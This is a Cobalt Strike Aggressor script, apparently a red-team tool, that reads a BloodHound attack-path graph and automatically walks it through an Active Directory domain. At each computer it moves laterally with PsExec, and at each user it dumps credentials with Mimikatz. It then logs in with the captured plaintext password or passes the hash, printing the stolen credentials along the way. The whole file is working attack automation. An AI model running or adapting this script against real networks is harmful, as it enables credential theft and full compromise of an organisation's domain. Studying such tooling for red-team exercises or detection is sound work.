# ANGRYPUPPY.cna
# Automate BloodHound attack path in Cobalt Strike
#
# Authors: Calvin Hedler (@001SPARTaN) and Vincent Yiu (@vysecurity)
#
# TODO: How to capture relationships - http://sleep.dashnine.org/manual/datastruct.html#3 ?

# org.json from https://mvnrepository.com/artifact/org.json/json
# Documentation - https://stleary.github.io/JSON-java/
import org.json.* from: /Users/vysec/Desktop/Tools/ANGRYPUPPY/json.jar;
include(script_resource("cypher.cna"));
include(script_resource("utils.cna"));

# Parse BloodHound graph.json and add nodes

# Ordered array with attack path in format
# @(@(%node, relationship), @(%node, relationship), @(%lastnode))
global('@relationships @edges @nodes @final $waitFor $currentBid $nextLabel $True $False $attackActive $pos $listener $psexec $mimikatz');

sub parseNodes {
    local('$json');

    $json = $1;

    # Create new JSONObject from string
    $obj = [new JSONObject: $json];

    # Create a new JSONArray from the "nodes" key
    $nodeArray = [new JSONArray: [$obj get: "nodes"]];

    # How many nodes?
    $length = [$nodeArray length];
    #println("Number of nodes: $length");

    # Iterate through all nodes and add to appropriate array
    for ($i = 0; $i < $length; $i++) {
        # Hash to store individual node information
        %node = %();

        $id = [[$nodeArray get: $i] get: "id"];
        $type = [[$nodeArray get: $i] get: "type"];
        $label = [[$nodeArray get: $i] get: "label"];

        %node["id"] = $id;
        %node["label"] = $label;
        %node["type"] = $type;

        add(@nodes, %node, -1);
    }

    foreach %node (@nodes) {
        if (%node["type"] eq "Computer") {
            #println("Computer: " . %node["label"]);
        }
        else if (%node["type"] eq "User") {
            #println("User: " . %node["label"]);
        }
    }
}

sub parseEdges {
    local('$json');
    $json = $1;

    $obj = [new JSONObject: $json];

    $edgeArray = [new JSONArray: [$obj get: "edges"]];

    $length = [$edgeArray length];
    #println("Number of edges: $length");

    for ($i = 0; $i < $length; $i++) {
        %edge = %();

        $id = [[$edgeArray get: $i] get: "id"];
        $label = [[$edgeArray get: $i] get: "label"];
        $source = [[$edgeArray get: $i] get: "source"];
        $target = [[$edgeArray get: $i] get: "target"];

        %edge["id"] = $id;
        %edge["label"] = $label;
        %edge["source"] = $source;
        %edge["target"] = $target;

        @edges[$i] = %edge;
        #println("Added edge: " . %edge);
    }
}

sub getFirstNode {
    local('@targets');

    foreach %edge (@edges) {
        add(@targets, %edge["target"]);
    }
    foreach %edge (@edges) {
        if (%edge["source"] !isin @targets) {
            foreach %node (@nodes) {
                if (%edge["source"] eq %node["id"]) {
                    #println("First node is: " . %node["id"]);
                    return %node;
                }
            }
        }
    }
}

sub getNextNode {
    local('%sourceNode');
    %sourceNode = $1;

    foreach %edge (@edges) {
        if (%edge["source"] == %sourceNode["id"]) {
                foreach %node (@nodes) {
                    if (%node["id"] == %edge["target"]) {
                        #println("Found next node: " . %node["id"]);
                        return %node;
                    }
                }
            }
    }
}

sub sortNodes {
    local ('@sorted %firstNode $length');

    $length = size(@nodes);

    %firstNode = getFirstNode();

    add(@sorted, %firstNode, 0);

    for ($i = 1; $i < $length; $i++){
        %next = getNextNode(@sorted[-1]);
        add(@sorted, %next, -1);
    }

    # println("Sorted nodes: " . @sorted);

    return @sorted;
}

sub removeGroups {
	
	@nodes = $1;

	foreach $i => $item (@nodes){
    	if ($item["type"] ne "Group"){
    		if ($item["type"] eq "User"){
    			$item["label"] = bhUserToCS-sub($item["label"]);
    		}
            else {
                $item["label"] = bhComputerToCS-sub($item["label"]);
            }
    		push(@final, $item);
    	}
    }

    return @final;
}

sub parseGraph {
    local('$graph $json $file');
    $graph = $1;
    $file = openf($graph);
    $True = "True";
    $False = "False";

    while $line (readln($file)) {
        $json = $json . $line;
    }

    closef($file);

    parseNodes($json);
    parseEdges($json);

    @nodelist = sortNodes();

    @final = removeGroups(@nodelist);

    # Set currentBid to first node

    # If Start node is a computer

    if (@final[0]["type"] eq "Computer"){
        println("First computer detected [!!!]");
    	$cLabel = @final[0]["label"];
    	foreach $session (beacons()) {
			if ($cLabel eq $session["computer"]) {
				$currentBid = $session["id"];
			}
		}
	}
    else{
        println("First user detected [!!!]");
    	# Start node is a user
    	$uLabel = uc(@final[0]["label"]);
        println($uLabel);
    	foreach $session (beacons()) {
            println($uLabel . " vs ". uc($session["user"]));
			if ($uLabel eq uc($session["user"])) {
				$currentBid = $session["id"];
			}
		}
    }

    foreach @a (@final){
        if (@a["type"] eq "Computer"){
            println("PSEXEC to " . @a["label"]);
        }
        else{
            println("Mimikatz for " . @a["label"]);
        }
    }

    println("[*] CurrentBid is $currentBid");

    $AttackActive = $False;

    # $currentBid is now the start node.

    # PROMPT WHAT LISTENER TO USE

    openPayloadHelper(lambda({
    	$listener = $1;
        $psexec = $False;
        $mimikatz = $False;

        # Reset waitFor
        $waitFor = "";

        $attackActive = $True;
        println("[*] Attack Activated");

        $pos = 0;
	}, $bids => $1));

}

on heartbeat_1s{

	if ($attackActive eq $True){
        println("[*] Executing after 5s");
		# Ignore current node 0 as it's the first node and our machine. So loop all the way to the end.
		$next = @final[$pos + 1];
		$nextLabel = uc($next["label"]);
        
		if (@final[$pos + 1]["type"] eq "Computer"){
			println("[LATERAL] : $nextLabel");
			
			#PSEXEC here
			if ($psexec eq $False){
				bpsexec_psh($currentBid, $nextLabel, $listener);
				$psexec = $True;
                #bpause($1, 10000);
                bstage($1, $null, $listener);
			}

            if ($waitFor eq $nextLabel) {
		    	# We got the beacon back and change the bid to the new one
		    	foreach $session (beacons()) {
                    $comp = $session["computer"];
                    $note = $session["note"];
					if (($comp eq $nextLabel) && ($note eq "ANGRYPUPPY")) {
						$currentBid = $session["id"];
						break;
					}
				}
				if (binfo($currentBid,"computer") eq $nextLabel){
					# All good to go
					$pos = $pos + 1;
                    $psexec = $False;
					
				}
			}
			else if ($waitFor ne "") {
			  	# Error occured, let's reset waitFor
			   	$waitFor = "";
			   	println("Error: WaitFor override with wrong beacon");
			}			
		
		}
		else {
			println("[MIMIKATZ]: $nextLabel");
			
			# At this point we already know we have a COMPUTER sesssion going, with SYSTEM, so we can just scrape the credentials.
			# If all works fine, $currentBid contains the machine we are working on and should be scraping creds from

			# MIMIKATZ HERE
			
            println("Mimikatz: " . $mimikatz);
            println("Wait For: " . $waitFor);
            println("Next Label: " . $nextLabel);

            if ($mimikatz eq $False) {
                blogonpasswords($currentBid);
				$mimikatz = $True;
                $waitFor = "";
                #bpause($currentBid, 5000);
			}

            if ($waitFor eq $nextLabel) {
				# We got the set of credentials we need in the cred store, we want to grab it out now.

                $plaintext = $False;
                $hashes = $False;
				foreach $cred (credentials()){
                    println("Comparing " . $cred["user"] . " vs. " . $nextLabel);
					if (($nextLabel eq uc($cred["user"])) && ($cred["password"] !ismatch "[0-9a-f]{32}")) {
						# Current $Cred object 
						$targetCreds = $cred;
                        $plaintext = $True;
						break;
					}
				}
                # Plaintext found? If not, let's go for a look at finding hashes.
                if ($plaintext eq $False){
                    foreach $cred (credentials()){
                        if ($nextLabel eq uc($cred["user"])) {
                            # Current $Cred object 
                            $targetCreds = $cred;
                            $hashes = $True;
                            $plaintext = $False;
                            break;
                        }
                    }   
                }

                if (($plaintext eq $True || $hashes eq $True) && (uc($targetCreds["user"]) eq $nextLabel)) {	
					# All good to go

                    # We have a plaintext or hash, so go ahead and get into context.
                    
                    $domain = $targetCreds["realm"];
                    $user = $targetCreds["user"];
                    $password = $targetCreds["password"];

                    println("Domain: " . $domain);
                    println("User: " . $user);
                    println("Password: " . $password);

                    if ($plaintext eq $True){
                        println("Using PLAIN TEXT LOGIN");
                        bloginuser($currentBid, $domain, $user, $password);
                    }
                    else {
                        # Must be a password hash at this point
                        println("Using PASS THE HASH");
                        bpassthehash($currentBid, $domain, $user, $password);
                    }
                    #bpause($currentBid, 5000);

					$pos = $pos + 1;
					$mimikatz = $False;
                }
				else{
					println("Credentials are not found in credential store for the target");
				}
			}
			else if ($waitFor ne "") {
				println("Error: WaitFor override with wrong credentials");
                println($waitFor . " vs. " . $nextLabel);
			}
		}
		if ($pos eq (size(@final) - 1)){
			# Finished attack path

			println("[*] Attack finished");
			$attackActive = $False;
		}
    }	# End $AttackActive
}
parseGraph(getFileProper(script_resource("graphs"), "graph4.json"));
